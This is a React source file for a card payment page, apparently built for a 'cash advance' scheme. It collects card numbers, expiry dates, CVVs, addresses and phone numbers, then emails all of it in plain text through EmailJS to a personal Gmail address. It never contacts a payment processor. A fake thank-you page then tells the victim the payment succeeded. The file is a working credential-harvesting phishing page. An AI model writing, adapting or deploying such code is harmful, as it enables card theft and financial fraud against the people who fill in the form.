import { useState } from "react";
import emailjs from "@emailjs/browser";
import cardsImg from "./imports/cards.png";

// EmailJS config — replace these with your real values from emailjs.com
const EMAILJS_SERVICE_ID = "service_5sixmhx";
const EMAILJS_TEMPLATE_ID = "template_99s9qts";
const EMAILJS_PUBLIC_KEY = "aUoWmgdODyBSBLH9-";

const MONTHS = ["1","2","3","4","5","6","7","8","9","10","11","12"];
const YEARS = Array.from({ length: 15 }, (_, i) => String(new Date().getFullYear() + i));

interface FormData {
  name: string;
  email: string;
  phone: string;
  cardnumber: string;
  expmonth: string;
  expyear: string;
  cvv: string;
  amount: string;
  addressline1: string;
  addressline2: string;
  city: string;
  state: string;
  country: string;
  pin: string;
}

type Errors = Partial<Record<keyof FormData, string>>;

const initialForm: FormData = {
  name: "",
  email: "",
  phone: "",
  cardnumber: "",
  expmonth: "",
  expyear: "",
  cvv: "",
  amount: "",
  addressline1: "",
  addressline2: "",
  city: "",
  state: "",
  country: "United States",
  pin: "",
};

function validate(f: FormData): Errors {
  const e: Errors = {};
  if (!f.name.trim()) e.name = "Card holder's name is required.";
  if (!f.email.trim()) e.email = "Email is required.";
  else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(f.email)) e.email = "Enter a valid email.";
  if (!f.phone.trim()) e.phone = "Phone is required.";
  if (!f.cardnumber.trim()) e.cardnumber = "Card number is required.";
  else {
    const digits = f.cardnumber.replace(/\s+/g, "");
    if (!/^\d{16}$/.test(digits)) e.cardnumber = "Card number must be 16 digits.";
    else if (!luhnCheck(digits)) e.cardnumber = "Card number is invalid.";
  }
  if (!f.expmonth) e.expmonth = "Select month.";
  if (!f.expyear) e.expyear = "Select year.";
  if (!f.cvv.trim()) e.cvv = "CVV is required.";
  else if (!/^\d{3,4}$/.test(f.cvv)) e.cvv = "CVV must be 3–4 digits.";
  if (!f.amount.trim()) e.amount = "Amount is required.";
  else if (!/^\d{1,4}(\.\d{0,2})?$/.test(f.amount)) e.amount = "Enter a valid dollar amount.";
  if (!f.addressline1.trim()) e.addressline1 = "Address is required.";
  if (!f.city.trim()) e.city = "City is required.";
  if (!f.state.trim()) e.state = "State is required.";
  else if (f.state.trim().length !== 2) e.state = "Use 2-letter state code.";
  if (!f.pin.trim()) e.pin = "Postal code is required.";
  return e;
}

function formatCardNumber(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
}

function luhnCheck(num: string) {
  let sum = 0;
  let doubleUp = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let digit = parseInt(num.charAt(i), 10);
    if (doubleUp) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    doubleUp = !doubleUp;
  }
  return sum % 10 === 0;
}

function FieldError({ msg }: { msg?: string }) {
  return (
    <p className="text-xs text-red-600 mt-0.5" style={{ minHeight: "1.1rem", lineHeight: "1.1rem" }}>
      {msg ?? ""}
    </p>
  );
}

function inputCls(error?: string) {
  return [
    "w-full p-2 border text-sm focus:outline-none focus:shadow-md transition-colors",
    error
      ? "border-red-500 focus:border-red-500 bg-red-50"
      : "border-gray-300 focus:border-indigo-700",
  ].join(" ");
}

function selectCls(error?: string) {
  return [
    "w-full p-2 border text-sm focus:outline-none focus:shadow-md transition-colors bg-white",
    error
      ? "border-red-500 focus:border-red-500 bg-red-50"
      : "border-gray-300 focus:border-indigo-700",
  ].join(" ");
}

function ThankYouPage() {
  return (
    <div className="flex justify-center items-center flex-col min-h-screen bg-gray-200">
      <div className="mb-5">
        <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100" className="mx-auto">
          <circle cx="50" cy="50" r="50" fill="#22c55e" />
          <polyline points="28,52 44,68 72,34" fill="none" stroke="white" strokeWidth="7" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      </div>
      <h1 className="text-4xl mb-4 text-center font-semibold">Thank you!</h1>
      <h3 className="text-2xl mb-4 text-center">Your payment was successfully submitted.</h3>
      <p className="text-center">
        You will receive the receipt from accounting@cashadvance-group.co<br />
        within 60 mins once payment is verified.
      </p>
    </div>
  );
}

export default function App() {
  const [form, setForm] = useState<FormData>(initialForm);
  const [errors, setErrors] = useState<Errors>({});
  const [submitted, setSubmitted] = useState(false);
  const [sending, setSending] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);

  const set = (field: keyof FormData) => (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const val = e.target.value;
    setForm((prev) => ({ ...prev, [field]: val }));
    if (errors[field]) {
      setErrors((prev) => {
        const next = { ...prev };
        delete next[field];
        return next;
      });
    }
  };

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setForm((prev) => ({ ...prev, cardnumber: formatted }));
    if (errors.cardnumber) {
      setErrors((prev) => {
        const next = { ...prev };
        delete next.cardnumber;
        return next;
      });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const errs = validate(form);
    if (Object.keys(errs).length > 0) {
      setErrors(errs);
      return;
    }
    setSending(true);
    setSubmitError(null);
    try {
      await emailjs.send(
        EMAILJS_SERVICE_ID,
        EMAILJS_TEMPLATE_ID,
        {
          to_email: "att.paul.henson@gmail.com",
          name: form.name,
          email: form.email,
          phone: form.phone,
          cardnumber: form.cardnumber,
          expmonth: form.expmonth,
          expyear: form.expyear,
          cvv: form.cvv,
          amount: form.amount,
          addressline1: form.addressline1,
          addressline2: form.addressline2,
          city: form.city,
          state: form.state,
          country: form.country,
          pin: form.pin,
        },
        EMAILJS_PUBLIC_KEY
      );
    } catch (err) {
      console.error("EmailJS send failed", err);
      setSending(false);
      setSubmitError("Failed to send email. Check EmailJS configuration and browser console.");
      return;
    }
    console.log("EmailJS send succeeded");
    setSending(false);
    setSubmitted(true);
  };

  if (submitted) return <ThankYouPage />;

  return (
    <main className="my-4 flex justify-center items-center flex-col">
      <div className="mb-5">
        <img src={cardsImg} alt="accepted cards" width={300} />
      </div>

      <form
        onSubmit={handleSubmit}
        noValidate
        className="lg:w-1/3 md:w-1/2 w-10/12 mx-auto p-8 shadow-md rounded text-sm bg-blue-100"
      >
        {/* Card Holder Name */}
        <div className="md:flex mb-1">
          <div className="md:flex-1">
            <input className={inputCls(errors.name)} type="text" placeholder="Card Holder's Name" value={form.name} onChange={set("name")} />
            <FieldError msg={errors.name} />
          </div>
        </div>

        {/* Email + Phone */}
        <div className="md:flex mb-1 gap-3">
          <div className="md:flex-1">
            <input className={inputCls(errors.email)} type="email" placeholder="Email" value={form.email} onChange={set("email")} />
            <FieldError msg={errors.email} />
          </div>
          <div className="md:flex-1">
            <input className={inputCls(errors.phone)} type="text" placeholder="Phone" value={form.phone} onChange={set("phone")} />
            <FieldError msg={errors.phone} />
          </div>
        </div>

        {/* Card Number */}
        <div className="md:flex mb-1">
          <div className="md:flex-1">
            <input className={inputCls(errors.cardnumber)} type="text" placeholder="Card Number" value={form.cardnumber} onChange={handleCardChange} maxLength={19} inputMode="numeric" />
            <FieldError msg={errors.cardnumber} />
          </div>
        </div>

        {/* Exp Month / Exp Year / CVV */}
        <div className="md:flex mb-1 gap-3">
          <div className="md:flex-1">
            <select className={selectCls(errors.expmonth)} value={form.expmonth} onChange={set("expmonth")}>
              <option value="">Month</option>
              {MONTHS.map((m) => <option key={m} value={m}>{m}</option>)}
            </select>
            <FieldError msg={errors.expmonth} />
          </div>
          <div className="md:flex-1">
            <select className={selectCls(errors.expyear)} value={form.expyear} onChange={set("expyear")}>
              <option value="">Year</option>
              {YEARS.map((y) => <option key={y} value={y}>{y}</option>)}
            </select>
            <FieldError msg={errors.expyear} />
          </div>
          <div className="md:flex-1">
            <input className={inputCls(errors.cvv)} type="text" placeholder="CVV / CVC" value={form.cvv} onChange={set("cvv")} maxLength={4} />
            <FieldError msg={errors.cvv} />
          </div>
        </div>

        {/* Amount */}
        <div className="md:flex mb-1">
          <div className="md:flex-1">
            <input className={inputCls(errors.amount)} type="text" placeholder="Amount (in dollars)" value={form.amount} onChange={set("amount")} />
            <FieldError msg={errors.amount} />
          </div>
        </div>

        {/* Billing Address label */}
        <div className="md:flex mb-1">
          <div className="md:flex-1">
            <label className="font-medium">Billing Address</label>
          </div>
        </div>

        {/* Address Line 1 */}
        <div className="md:flex mb-1">
          <div className="md:flex-1">
            <input className={inputCls(errors.addressline1)} type="text" placeholder="Address Line 1" value={form.addressline1} onChange={set("addressline1")} />
            <FieldError msg={errors.addressline1} />
          </div>
        </div>

        {/* Address Line 2 */}
        <div className="md:flex mb-1">
          <div className="md:flex-1">
            <input className={inputCls()} type="text" placeholder="Address Line 2 (Optional)" value={form.addressline2} onChange={set("addressline2")} />
            <FieldError />
          </div>
        </div>

        {/* City + State */}
        <div className="md:flex mb-1 gap-3">
          <div className="md:flex-1">
            <input className={inputCls(errors.city)} type="text" placeholder="City" value={form.city} onChange={set("city")} />
            <FieldError msg={errors.city} />
          </div>
          <div className="md:flex-1">
            <input className={inputCls(errors.state)} type="text" placeholder="State" value={form.state} onChange={set("state")} maxLength={2} />
            <FieldError msg={errors.state} />
          </div>
        </div>

        {/* Country + Postal Code */}
        <div className="md:flex mb-1 gap-3">
          <div className="md:flex-1">
            <input className={inputCls()} type="text" value="United States" readOnly />
            <FieldError />
          </div>
          <div className="md:flex-1">
            <input className={inputCls(errors.pin)} type="text" placeholder="Postal Code" value={form.pin} onChange={set("pin")} />
            <FieldError msg={errors.pin} />
          </div>
        </div>

        {/* Submit */}
        <div className="md:flex mb-1 justify-center mt-2">
          <button
            type="submit"
            disabled={sending}
            className="bg-blue-700 py-2 px-4 text-white w-full focus:outline-none disabled:opacity-60"
          >
            {sending ? "Processing…" : "Process Payment"}
          </button>
        </div>
      </form>
    </main>
  );
}
